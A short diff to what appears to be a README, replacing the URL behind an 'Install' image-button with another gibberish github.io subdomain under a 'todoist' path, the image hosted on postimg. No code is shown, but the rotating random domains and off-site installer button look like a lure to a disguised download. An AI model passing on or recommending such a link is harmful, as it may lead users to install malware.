@@ -14,7 +14,7 @@
 </p>
 
 <p align="center">
-  <a href="https://aiaoadnakjsdh-arps.github.io/.github/todoist">
+  <a href="https://ukabvar-losos.github.io/.github/todoist">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
   </a>
 </p>
